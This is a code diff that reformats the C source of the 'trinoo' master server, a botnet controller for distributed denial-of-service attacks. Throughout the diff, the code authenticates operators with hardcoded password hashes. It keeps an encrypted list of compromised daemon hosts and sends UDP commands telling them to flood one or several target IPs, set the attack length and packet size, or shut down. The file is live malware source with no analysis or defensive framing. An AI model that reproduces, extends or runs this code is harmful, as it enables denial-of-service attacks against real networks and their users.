@@ -54,13 +54,12 @@ char *encrypt_string(char *, char *);
 char *decrypt_string(char *, char *);
 #endif
 
-int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), char **envp __attribute__((unused)))
+int main(int argc __attribute__ ((unused)), char **argv __attribute__ ((unused)), char **envp __attribute__ ((unused)))
 {
 	struct sockaddr_in master, from, tcpmast, tcpconn;
 	socklen_t fromlen;
 	int sock, sock2, numread, bewm = 0, auth = 0, alt;
-	int list = 1, foke, hoe, blist, argi, outport = CLIENT_PORT, ttout =
-	    300, idle = 0;
+	int list = 1, foke, hoe, blist, argi, outport = CLIENT_PORT, ttout = 300, idle = 0;
 	unsigned int i;
 	int pongr = 0;
 	FILE *out;
@@ -131,30 +130,19 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 			if (FD_ISSET(sock, &myfds)) {
 				bzero(buf, 1024);
 				fromlen = sizeof(from);
-				if ((numread ==
-				     recvfrom(sock, buf, 1024, 0,
-					      (struct sockaddr *)&from,
-					      &fromlen)) == -1) {
+				if ((numread == recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from, &fromlen)) == -1) {
 					perror("read");
 					continue;
 				}
 				if (buf[0] == old)
 					sprintf(buf, "*HELLO*");
 				if (strcmp("*HELLO*", buf) == 0) {
-					if (checkonip
-					    ((char *)inet_ntoa(from.sin_addr)) >
-					    0) {
+					if (checkonip((char *)inet_ntoa(from.sin_addr)) > 0) {
 						out = fopen(OUTFILE, "a");
-						sprintf(outbuf, "%s",
-							(char *)
-							inet_ntoa
-							(from.sin_addr));
+						sprintf(outbuf, "%s", (char *)
+							inet_ntoa(from.sin_addr));
 #ifdef CRYPTKEY
-						enc =
-						    encrypt_string
-						    (decrypt_string
-						     ("bored", CRYPTKEY),
-						     outbuf);
+						enc = encrypt_string(decrypt_string("bored", CRYPTKEY), outbuf);
 						sprintf(outbuf, "%s", enc);
 #endif
 						fprintf(out, "%s\n", outbuf);
@@ -162,48 +150,31 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 						fclose(out);
 						chmod(OUTFILE, 0600);
 						if (bewm > 0) {
-							sprintf(outbuf,
-								"NEW Bcast - %s\n",
-								inet_ntoa
-								(from.sin_addr));
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "NEW Bcast - %s\n", inet_ntoa(from.sin_addr));
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 					}
 				}
 				if (strcmp("PONG", buf) == 0)
 					if (bewm > 0) {
 						pongr++;
-						sprintf(outbuf,
-							"PONG %d Received from %s\n",
-							pongr,
-							inet_ntoa
-							(from.sin_addr));
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "PONG %d Received from %s\n", pongr, inet_ntoa(from.sin_addr));
+						Write(bewm, outbuf, strlen(outbuf));
 					}
 			}
 			if (FD_ISSET(sock2, &myfds)) {
 				fromlen = sizeof(struct sockaddr);
 				if (list > 0) {
-					bewm =
-					    accept(sock2,
-						   (struct sockaddr *)&tcpconn,
-						   &fromlen);
+					bewm = accept(sock2, (struct sockaddr *)&tcpconn, &fromlen);
 					auth = 0;
 					list = 0;
 					idle = time(NULL);
 				} else {
-					alt =
-					    accept(sock2,
-						   (struct sockaddr *)&tcpconn,
-						   &fromlen);
+					alt = accept(sock2, (struct sockaddr *)&tcpconn, &fromlen);
 					close(alt);
 				}
 				if (auth == 1) {
-					sprintf(outbuf,
-						"Warning: Connection from %s\n",
-						(char *)
+					sprintf(outbuf, "Warning: Connection from %s\n", (char *)
 						inet_ntoa(tcpconn.sin_addr));
 					Write(bewm, outbuf, strlen(outbuf));
 				}
@@ -223,14 +194,9 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 					if (buf[i] == '\r')
 						buf[i] = 0;
 				if (!auth) {
-					if (strcmp
-					    ((char *)crypt(buf, "be"),
-					     "beUBZbLtK7kkY") == 0) {
-						sprintf(outbuf,
-							"trinoo %s..[rpm8d/cb4Sx/]\n\n\n",
-							VERSION);
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+					if (strcmp((char *)crypt(buf, "be"), "beUBZbLtK7kkY") == 0) {
+						sprintf(outbuf, "trinoo %s..[rpm8d/cb4Sx/]\n\n\n", VERSION);
+						Write(bewm, outbuf, strlen(outbuf));
 						auth = 1;
 					} else {
 						close(bewm);
@@ -243,57 +209,37 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 					Write(bewm, outbuf, strlen(outbuf));
 					out = fopen(OUTFILE, "r");
 					if (out == NULL) {
-						sprintf(outbuf,
-							"ERROR: Cannot open Bcasts file. Will create a new BLANK one.\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "ERROR: Cannot open Bcasts file. Will create a new BLANK one.\n");
+						Write(bewm, outbuf, strlen(outbuf));
 						out = fopen(OUTFILE, "w");
 						if (out == NULL) {
-							sprintf(outbuf,
-								"ERROR: Cannot even create a blank Bcasts. Mine as well shutdown the server.\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "ERROR: Cannot even create a blank Bcasts. Mine as well shutdown the server.\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 					} else {
 						blist = 0;
 						while (fgets(outbuf, 1024, out)
 						       != NULL) {
-							if (outbuf
-							    [strlen(outbuf)] ==
-							    '\n')
-								outbuf[strlen
-								       (outbuf)
+							if (outbuf[strlen(outbuf)] == '\n')
+								outbuf[strlen(outbuf)
 								       - 1] = 0;
 #ifdef CRYPTKEY
-							dec =
-							    decrypt_string
-							    (decrypt_string
-							     ("bored",
-							      CRYPTKEY),
-							     outbuf);
-							sprintf(outbuf, "%s\n",
-								dec);
+							dec = decrypt_string(decrypt_string("bored", CRYPTKEY), outbuf);
+							sprintf(outbuf, "%s\n", dec);
 #endif
 							if (strlen(outbuf) > 3) {
 								blist++;
-								Write(bewm,
-								      outbuf,
-								      strlen
-								      (outbuf));
+								Write(bewm, outbuf, strlen(outbuf));
 							}
 						}
 						fclose(out);
 						chmod(OUTFILE, 0600);
-						sprintf(outbuf,
-							"\nEnd. %d Bcasts total.\n",
-							blist);
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "\nEnd. %d Bcasts total.\n", blist);
+						Write(bewm, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(buf, "die") == 0) {
-					sprintf(outbuf,
-						"Shutting down.\nNOTICE: Better restart me?\n");
+					sprintf(outbuf, "Shutting down.\nNOTICE: Better restart me?\n");
 					Write(bewm, outbuf, strlen(outbuf));
 					close(bewm);
 					close(sock);
@@ -314,162 +260,108 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 				sscanf(buf, "%s %s", comm, arg1);
 				if (strcmp(comm, "mtimer") == 0) {
 					if (strlen(arg1) < 1) {
-						sprintf(outbuf,
-							"mtimer: usage: mtimer <seconds to DoS>\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "mtimer: usage: mtimer <seconds to DoS>\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					} else {
 						argi = atoi(arg1);
 						if (argi > 2000) {
 							argi = 500;
-							sprintf(outbuf,
-								"mtimer: You specified amount over 2000, set to 500!\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "mtimer: You specified amount over 2000, set to 500!\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (argi < 1) {
 							argi = 300;
-							sprintf(outbuf,
-								"mtimer: You specified amount less than one. Set to 300!\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "mtimer: You specified amount less than one. Set to 300!\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
-						sprintf(outbuf,
-							"mtimer: Setting timer on bcast to %d.\n",
-							argi);
-						Write(bewm, outbuf,
-						      strlen(outbuf));
-						sprintf(outbuf, "bbb %s %d",
-							pass, argi);
-						sendtolist(outport, outbuf,
-							   strlen(outbuf));
+						sprintf(outbuf, "mtimer: Setting timer on bcast to %d.\n", argi);
+						Write(bewm, outbuf, strlen(outbuf));
+						sprintf(outbuf, "bbb %s %d", pass, argi);
+						sendtolist(outport, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "dos") == 0) {
 					if (strlen(arg1) < 1) {
-						sprintf(outbuf,
-							"DoS: usage: dos <ip>\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "DoS: usage: dos <ip>\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					} else {
-						sprintf(outbuf,
-							"DoS: Packeting %s.\n",
-							arg1);
-						Write(bewm, outbuf,
-						      strlen(outbuf));
-						sprintf(outbuf, "aaa %s %s",
-							pass, arg1);
-						sendtolist(outport, outbuf,
-							   strlen(outbuf));
+						sprintf(outbuf, "DoS: Packeting %s.\n", arg1);
+						Write(bewm, outbuf, strlen(outbuf));
+						sprintf(outbuf, "aaa %s %s", pass, arg1);
+						sendtolist(outport, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "mdie") == 0) {
-					if (strcmp
-					    ((char *)crypt(arg1, "Er"),
-					     "ErDVt6azHrePE") == 0) {
-						sprintf(outbuf,
-							"mdie: Disabling Bcasts.\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+					if (strcmp((char *)crypt(arg1, "Er"), "ErDVt6azHrePE") == 0) {
+						sprintf(outbuf, "mdie: Disabling Bcasts.\n");
+						Write(bewm, outbuf, strlen(outbuf));
 						sprintf(outbuf, "d1e %s", pass);
-						sendtolist(outport, outbuf,
-							   strlen(outbuf));
+						sendtolist(outport, outbuf, strlen(outbuf));
 					} else {
-						sprintf(outbuf,
-							"mdie: password?\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "mdie: password?\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "mping") == 0) {
-					sprintf(outbuf,
-						"mping: Sending a PING to every Bcasts.\n");
+					sprintf(outbuf, "mping: Sending a PING to every Bcasts.\n");
 					Write(bewm, outbuf, strlen(outbuf));
 					pongr = 0;
 					sprintf(outbuf, "png %s", pass);
-					sendtolist(outport, outbuf,
-						   strlen(outbuf));
+					sendtolist(outport, outbuf, strlen(outbuf));
 				}
 				if (strcmp(comm, "mdos") == 0) {
 					if (strlen(arg1) < 3) {
-						sprintf(outbuf,
-							"MDoS: usage: mdos <ip1:ip2:ip3:>\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "MDoS: usage: mdos <ip1:ip2:ip3:>\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					} else {
-						sprintf(outbuf,
-							"MDoS: Packeting %s.\n",
-							arg1);
-						Write(bewm, outbuf,
-						      strlen(outbuf));
-						sprintf(outbuf,
-							"xyz %s 123:%s:", pass,
-							arg1);
-						sendtolist(outport, outbuf,
-							   strlen(outbuf));
+						sprintf(outbuf, "MDoS: Packeting %s.\n", arg1);
+						Write(bewm, outbuf, strlen(outbuf));
+						sprintf(outbuf, "xyz %s 123:%s:", pass, arg1);
+						sendtolist(outport, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "info") == 0) {
-					sprintf(outbuf,
-						"This is the \"trinoo\" AKA DoS Project master server. [%s]\nCompiled: %s %s\n",
-						VERSION, __TIME__, __DATE__);
+					sprintf(outbuf, "This is the \"trinoo\" AKA DoS Project master server. [%s]\nCompiled: %s %s\n", VERSION, __TIME__, __DATE__);
 					Write(bewm, outbuf, strlen(outbuf));
 				}
 				if (strcmp(comm, "msize") == 0) {
 					if (atoi(arg1) > 0) {
-						sprintf(outbuf, "rsz %d",
-							atoi(arg1));
-						sendtolist(outport, outbuf,
-							   strlen(outbuf));
+						sprintf(outbuf, "rsz %d", atoi(arg1));
+						sendtolist(outport, outbuf, strlen(outbuf));
 					} else {
-						sprintf(outbuf,
-							"msize: usage: msize <size>\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "msize: usage: msize <size>\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					}
 				}
 				if (strcmp(comm, "nslookup") == 0) {
 					if (strlen(arg1) < 3) {
-						sprintf(outbuf,
-							"nslookup: usage: nslookup <host>\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "nslookup: usage: nslookup <host>\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					} else {
 						he = gethostbyname(arg1);
 						if (he == NULL) {
-							sprintf(outbuf,
-								"nslookup: host not found[%s]\n",
-								arg1);
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "nslookup: host not found[%s]\n", arg1);
+							Write(bewm, outbuf, strlen(outbuf));
 						} else {
-							memcpy(&lookip,
-							       (he->h_addr), 4);
-							sprintf(outbuf,
-								"nslookup: resolved %s to %s\n",
-								arg1, (char *)
-								inet_ntoa
-								(lookip));
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							memcpy(&lookip, (he->h_addr), 4);
+							sprintf(outbuf, "nslookup: resolved %s to %s\n", arg1, (char *)
+								inet_ntoa(lookip));
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 					}
 				}
 				if (strcmp(comm, "killdead") == 0) {
-					sprintf(outbuf,
-						"killdead: Attempting to kill all dead broadcast\n");
+					sprintf(outbuf, "killdead: Attempting to kill all dead broadcast\n");
 					Write(bewm, outbuf, strlen(outbuf));
 					sprintf(outbuf, "shi %s", pass);
-					sendtolist(outport, outbuf,
-						   strlen(outbuf));
+					sendtolist(outport, outbuf, strlen(outbuf));
 					sprintf(outbuf, "%s-b", OUTFILE);
 					rename(OUTFILE, outbuf);
 					out = fopen(OUTFILE, "a");
 					fclose(out);
 				}
 				if (strcmp(comm, "usebackup") == 0) {
-					sprintf(outbuf,
-						"usebackup: Switching to backup data file, If exist.\n");
+					sprintf(outbuf, "usebackup: Switching to backup data file, If exist.\n");
 					Write(bewm, outbuf, strlen(outbuf));
 					sprintf(outbuf, "%s-b", OUTFILE);
 					if ((out = fopen(outbuf, "r")) != NULL) {
@@ -479,73 +371,50 @@ int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), 
 				}
 				if (strcmp(comm, "help") == 0) {
 					if (strlen(arg1) < 3) {
-						sprintf(outbuf,
-							"Commands: info bcast mping mtimer dos mdos mdie quit nslookup\nDon't know what something is? 'help command'\n");
-						Write(bewm, outbuf,
-						      strlen(outbuf));
+						sprintf(outbuf, "Commands: info bcast mping mtimer dos mdos mdie quit nslookup\nDon't know what something is? 'help command'\n");
+						Write(bewm, outbuf, strlen(outbuf));
 					} else {
 						if (strcmp(arg1, "info") == 0) {
-							sprintf(outbuf,
-								"help info: Shows version/compile date of server\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help info: Shows version/compile date of server\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "bcast") == 0) {
-							sprintf(outbuf,
-								"help bcast: Lists broadcasts.\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help bcast: Lists broadcasts.\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 
 						if (strcmp(arg1, "mping") == 0) {
-							sprintf(outbuf,
-								"help mping: Sends a PING to every Bcasts.\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help mping: Sends a PING to every Bcasts.\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 
 						if (strcmp(arg1, "mtimer") == 0) {
-							sprintf(outbuf,
-								"help mtimer: Sets amount of seconds the Bcasts will DoS target.\nUsage: mtimer <seconds>\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help mtimer: Sets amount of seconds the Bcasts will DoS target.\nUsage: mtimer <seconds>\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "dos") == 0) {
-							sprintf(outbuf,
-								"help dos: Packets target.\nUsage: dos <ip>\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help dos: Packets target.\nUsage: dos <ip>\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "mdos") == 0) {
-							sprintf(outbuf,
-								"help mdos: WARNING *BETA*\nPackets Targets at same time.\nUsage: mdos <target 1:target 2:target 3:>\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help mdos: WARNING *BETA*\nPackets Targets at same time.\nUsage: mdos <target 1:target 2:target 3:>\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "mdie") == 0) {
-							sprintf(outbuf,
-								"help mdie: WARNING DO NOT USE!\nDisables all Bcasts. Makes the daemon die.\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help mdie: WARNING DO NOT USE!\nDisables all Bcasts. Makes the daemon die.\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "quit") == 0) {
-							sprintf(outbuf,
-								"help quit: Closes this connection!\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help quit: Closes this connection!\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
-						if (strcmp(arg1, "nslookup") ==
-						    0) {
-							sprintf(outbuf,
-								"help nslookup: Resolves hostname to a IP Address.\nUsage: nslookup <host>\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+						if (strcmp(arg1, "nslookup") == 0) {
+							sprintf(outbuf, "help nslookup: Resolves hostname to a IP Address.\nUsage: nslookup <host>\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 						if (strcmp(arg1, "mstop") == 0) {
-							sprintf(outbuf,
-								"help mstop: Attempts to stop DoS.\n");
-							Write(bewm, outbuf,
-							      strlen(outbuf));
+							sprintf(outbuf, "help mstop: Attempts to stop DoS.\n");
+							Write(bewm, outbuf, strlen(outbuf));
 						}
 					}
 				}
@@ -579,9 +448,7 @@ int checkonip(char *ip)
 			if (buf[strlen(buf) - 1] == '\n')
 				buf[strlen(buf) - 1] = '\0';
 #ifdef CRYPTKEY
-			dec =
-			    decrypt_string(decrypt_string("bored", CRYPTKEY),
-					   buf);
+			dec = decrypt_string(decrypt_string("bored", CRYPTKEY), buf);
 			sprintf(buf, "%s", dec);
 #endif
 			if (strcmp(ip, buf) == 0)
@@ -611,15 +478,12 @@ int sendtolist(int port, char *outbuf, int len)
 			if (buf[strlen(buf) - 1] == '\n')
 				buf[strlen(buf) - 1] = '\0';
 #ifdef CRYPTKEY
-			dec =
-			    decrypt_string(decrypt_string("bored", CRYPTKEY),
-					   buf);
+			dec = decrypt_string(decrypt_string("bored", CRYPTKEY), buf);
 			sprintf(buf, "%s", dec);
 #endif
 			if (strlen(buf) > 3) {
 				out.sin_addr.s_addr = inet_addr(buf);
-				sendto(sock, outbuf, len, 0,
-				       (struct sockaddr *)&out, sizeof(out));
+				sendto(sock, outbuf, len, 0, (struct sockaddr *)&out, sizeof(out));
 			}
 		}
 		fclose(outread);
